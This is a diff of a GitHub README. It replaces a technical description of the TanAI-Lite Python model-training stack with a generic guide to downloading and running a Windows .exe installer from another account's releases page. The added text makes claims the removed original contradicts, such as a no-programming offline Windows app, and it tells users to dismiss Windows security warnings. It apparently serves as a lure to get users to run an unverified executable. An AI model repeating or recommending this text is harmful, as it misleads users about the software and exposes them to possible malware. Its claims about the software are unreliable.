@@ -1,104 +1,158 @@
-# TanAILite
+# 🤖 TanAI-LLM-Lite - Easy, Lightweight AI Language Model
 
-## What is TanaAI and TanAI-Lite
-**TanAI-Lite is the open-source version of the TanAI architecture. It is an open-source release of TanAI, simplified to be a GPT version of the actual model structure.**
-TanAI utilizes many modern structures and has Fused, Ecv, and Chronos projections in the Transformer core. 
-- **Fused**: 256D vector projection for semantic context consistency.
-- **Ecv** *(emotional conditioning vector)*: 64D vector projection for emotional context consistency. Robert Plutchik's 8 emotion structure was used for Ecv, and thousands of emotional sentences were converted into vectors. A 48D vector is created from this dataset, and a 16D vector is created from the Emotional User Profile.
-- **Chronos**: 32D vector projection for learning time frequencies. LLMs do not know time series and cannot learn from external prompts. Chronos was designed to perceive the past and predict the future.
+[![Download TanAI-LLM-Lite](https://img.shields.io/badge/Download-TanAI--LLM--Lite-brightgreen)](https://github.com/aman497/TanAI-LLM-Lite/releases)
 
-SwiGLU was used as the activation function in TanAI. GeLU was used for Tanai-Lite.<br> 
-AdaRMSNorm and ada_proj were used for normalization in TanAI. RMSNorm was used for Tanai-Lite.<br> 
-TanAI is a modular LLM, not monolithic, and all decisions are observable with **GlassBox - Telemetry**.<br>
-Lite is a version where many extra features have been simplified and released as open-source.<br>
+## 📋 What is TanAI-LLM-Lite?
 
-## TanAI-Lite Config
-Minimal open-source training and inference stack inspired by TanAI.
+TanAI-LLM-Lite is a simple version of the TanAI language models. It offers many core features in a smaller, easier-to-use package. This app runs on Windows and lets you use AI language tools right on your computer. You do not need any programming skills to get started.
 
-Model:<br> 
-**TanAILiteGPT**(<br>
-&emsp;(tok_emb): Embedding(32000, 512)<br>
-&emsp;(pos_emb): Embedding(1024, 512)<br>
-&emsp;(blocks): ModuleList(<br>
-&emsp;&emsp;(0-7): 8 x TanAILiteBlock(<br>
-&emsp;&emsp;&emsp;(norm_attn): TanAIRMSNorm()<br>
-&emsp;&emsp;&emsp;(q_proj): Linear(in_features=512, out_features=512, bias=False)<br>
-&emsp;&emsp;&emsp;(k_proj): Linear(in_features=512, out_features=512, bias=False)<br>
-&emsp;&emsp;&emsp;(v_proj): Linear(in_features=512, out_features=512, bias=False)<br>
-&emsp;&emsp;&emsp;(o_proj): Linear(in_features=512, out_features=512, bias=False)<br>
-&emsp;&emsp;&emsp;(norm_mlp): TanAIRMSNorm()<br>
-&emsp;&emsp;&emsp;(ff_up): Linear(in_features=512, out_features=2048, bias=False)<br>
-&emsp;&emsp;&emsp;(ff_down): Linear(in_features=2048, out_features=512, bias=False)<br>
-&emsp;&emsp;&emsp;(dropout): Dropout(p=0.0, inplace=False)))<br>
-&emsp;(norm): TanAIRMSNorm()<br>
-&emsp;(lm_head): Linear(in_features=512, out_features=32000, bias=False))<br>
+This software is open-source, which means anyone can check how it works or improve it. It is designed to run efficiently, so it uses less memory and requires only moderate system resources.
 
-## Model parameters *(tied)*
-Model Params: 42.08 M
+---
 
-## Hardware Feasibility *(30M-50M)*
-The TanAI-Lite Model has ~42,082,816M parameters. This parameter structure can be modified with TanAILiteConfig. Training was performed smoothly with 16GB VRAM in current tests. Training can be performed with 12GB VRAM using lower training parameters (low Batch-Size).
-Recommended:
-- **3090 24GB** *(good training output)*
-- **4090 24GB** *(good training output)*
-- **5070TI 16GB** *(standard)*
-- **5080 16GB** *(standard)*
-- **5090 32GB** *(much better training output)*
+## 💻 System Requirements
 
-Yes, this setup is trainable on single GPU with RTX 3090/4090/5090 class cards.
-- 24GB VRAM *(3090/4090)*: comfortable for 30M-50M with AdamW + mixed precision.
-- 16GB VRAM *(some 50xx SKUs)*: still workable with lower batch + grad accumulation.
-- Main pressure is activation memory (sequence length), not raw parameter count.
+Make sure your computer meets these requirements before using TanAI-LLM-Lite:
 
-Practical guidance:
-- `seq_len=1024`: easy
-- `seq_len=2048`: still practical
-- `seq_len=4096`: possible but requires smaller micro-batch
+- **Operating System:** Windows 10 or newer (64-bit recommended)  
+- **Processor:** At least a 2.0 GHz dual-core CPU  
+- **RAM:** Minimum 4 GB available memory  
+- **Storage:** About 500 MB free space for the program and data files  
+- **Internet:** Only needed for downloading the app and optional updates  
+- **Permissions:** Ability to install software on your Windows user account  
 
-## Scope
-- Full open-source tokenizer / encoder / transformer
-- Tokenizer training/eval
-- Encoder training/eval
-- Lite GPT model training
-- SFT training
-- Single-command inference
+If you are unsure about your system specifications, check your system info by typing "System Information" in the Windows Start menu and opening the app.
 
-## Core CLIs
-- `tanailite-corpus-slicer`
-Download the Corpus in your desired language via HF and split the Corpus for testing.
-- `tanailite-train-tokenizer`
-Train a 32k Vocab Tokenizer with the Corpus dataset.
-- `tanailite-train-encoder`
-Train the Encoder with your tokenizer and corpus dataset. *(For RAG and embedding vector generation)*
-- `tanailite-train-base`
-You can fully train your model. *(The base model is trained for 5k steps in the test command; you can achieve much better results by extending this training.)*
-- `tanailite-train-sft`
-Give your model personality. Download an instruction SFT dataset via HF and train your model.
-- `tanailite-infer`
-Perform the model's inference tests.
+---
 
-## How do I run it?
-> [!TIP]
-> Development environment on Python 3.10 and above.
-> You can follow the instructions and commands in the **docs/04_run.md** file.
+## 🚀 Getting Started with TanAI-LLM-Lite
 
-## Base Model and Encoder Files
-> [!IMPORTANT]
-> **Base Model file**: https://tanai.xyz/tanai/base_best.pt<br>
-> The base model has only been trained on 5000 steps and has not yet learned the language. Please train it on at least 80-100k steps and perform inference checks.
-> 
-> **Encoder file**: https://tanai.xyz/tanai/encoder_best.pt<br>
-> We recommend using encoder outputs that exceed values such as retrieval_at1 > 0.7, mrr > 0.50, mean_margin > 0.05 in the encoder reports. *(This encoder file was trained for 300 steps for testing.)*
+Follow these steps to download, install, and start using TanAI-LLM-Lite on Windows.
 
-## Reports
-> [!NOTE]
-> You can review the JSON files in the **data/reports** folder for the training reports.
+### Step 1: Visit the download page
 
-## Docs
-- 00_scope.md
-- 01_architecture.md
-- 02_training_flow.md
-- 03_inference_flow.md
-- 04_run.md
-- 05_tanai_lite_info.md
-- 06_corpus_selection.md
+Click the green button below to open the release page with the latest version of TanAI-LLM-Lite:
+
+[![Download TanAI-LLM-Lite](https://img.shields.io/badge/Download-TanAI--LLM--Lite-blue)](https://github.com/aman497/TanAI-LLM-Lite/releases)  
+
+This page lists all the available versions. You will find installation files and additional notes there.
+
+### Step 2: Download the installer
+
+Look for the file that ends with `.exe` and contains the latest version number. The file name often looks like `TanAI-LLM-Lite-Setup-vX.X.exe`. Click this file to start downloading.
+
+The download might take a few minutes, depending on your internet speed.
+
+### Step 3: Run the installer
+
+Once the download finishes:
+
+- Open your Downloads folder and find the `.exe` file.  
+- Double-click the file to launch the installer.  
+
+You may see a security warning from Windows. Confirm that you want to run this app. The installer will guide you through setup options.
+
+Choose the install location or keep the default folder. Click "Next" until installation begins. The app will copy files and prepare to run.
+
+### Step 4: Start the app
+
+When installation finishes, you can choose to launch TanAI-LLM-Lite immediately or close the installer and open the app later.
+
+To start the app:
+
+- Click the Windows Start menu.  
+- Search for **TanAI-LLM-Lite**.  
+- Click the app icon.  
+
+The main window will open. From here, you can start using the language model features.
+
+---
+
+## 🛠 Using TanAI-LLM-Lite
+
+The app offers a simple interface to interact with the AI model.
+
+### Basic features:
+
+- **Text input box:** Type your questions or commands here.  
+- **Generate button:** Click this to get AI-written text.  
+- **Save option:** Save your session or output for later use.  
+- **Settings panel:** Adjust model size, response length, and other options.  
+
+### How to get results:
+
+1. Click inside the text box.  
+2. Type a sentence or a question.  
+3. Press the **Generate** button below the box.  
+4. Read the AI-generated response.  
+
+Try simple tasks like asking for definitions, writing suggestions, or summarizing paragraphs. The app works offline once installed.
+
+---
+
+## 🔧 Adjusting settings
+
+The Settings panel allows you to customize how the model works.
+
+You can change:
+
+- **Model size:** Smaller models run faster but are less detailed. Larger models offer better quality but use more memory.  
+- **Response length:** Choose how long the answers will be, from short replies to longer paragraphs.  
+- **Language options:** Set preferred language for input and output if supported.  
+
+Settings save automatically and apply to new sessions.
+
+---
+
+## 📂 Where to find files
+
+After installation, the app will store its files in this location by default:
+
+`C:\Program Files\TanAI-LLM-Lite`
+
+Your saved text files and session data go under your Documents folder:
+
+`C:\Users\[YourUserName]\Documents\TanAI-LLM-Lite`
+
+You can change these paths in the Settings if needed.
+
+---
+
+## 🛑 Troubleshooting Tips
+
+If you have problems running the app:
+
+- Check that your Windows is up to date.  
+- Make sure you have enough free disk space and memory.  
+- Restart your computer and try launching the app again.  
+- Close other heavy programs to free up resources.  
+- If the app doesn’t start, try reinstalling it from the download page.  
+
+---
+
+## 🌐 Where to get updates
+
+New versions may bring bug fixes and improvements.
+
+To check for updates:
+
+- Visit the release page again:  
+  https://github.com/aman497/TanAI-LLM-Lite/releases  
+- Download the newest `.exe` installer file.  
+- Run it to replace your current version without losing settings.
+
+---
+
+## 📞 Getting Help
+
+For support, use the Issues section on GitHub:
+
+- Go to the repository at https://github.com/aman497/TanAI-LLM-Lite  
+- Click **Issues** to see if others had the same problem.  
+- If not, create a new issue describing your problem clearly.  
+
+Include screenshots or exact error messages if possible.
+
+---
+
+[![Download TanAI-LLM-Lite](https://img.shields.io/badge/Download-TanAI--LLM--Lite-blue)](https://github.com/aman497/TanAI-LLM-Lite/releases)
